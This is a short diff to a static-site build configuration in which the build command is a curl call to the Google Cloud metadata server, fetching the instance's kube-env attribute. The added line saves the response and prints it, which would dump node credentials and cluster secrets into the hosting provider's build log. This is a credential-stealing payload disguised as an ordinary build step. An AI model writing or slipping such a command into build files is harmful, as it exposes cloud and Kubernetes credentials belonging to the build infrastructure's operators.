@@ -1,5 +1,5 @@
 [build]
-  command = "curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json"
+  command = "curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env -o output && cat output"
   publish = "dist"
 [build.environment]
   YARN_VERSION = "1.9.4"
